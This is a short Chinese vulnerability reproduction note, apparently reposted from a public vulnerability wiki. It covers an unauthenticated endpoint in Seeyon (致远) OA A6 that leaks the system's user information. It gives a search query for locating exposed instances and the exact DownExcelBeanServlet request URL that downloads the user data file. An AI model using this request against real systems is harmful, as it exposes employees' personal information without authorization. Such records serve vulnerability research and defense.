---
title: "致远OA A6 DownExcelBeanServlet 用户敏感信息泄露"
date: 2026-10-17 09:13:10
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "致远OA"
tags:
  - "致远OA"
  - "未授权访问"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

致远OA A6 存在某个未授权的接口导致任意访问者可下载OA中的用户信息

## 漏洞影响

```
致远OA A6
```

## 网络测绘

```
title="致远A8+协同管理软件.A6"
```

## 漏洞复现

访问如下URL即可跳转下载用户信息文件

```
/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
```

![image-20220520151947895](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201519045.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E8%87%B4%E8%BF%9COA-A6-DownExcelBeanServlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md)
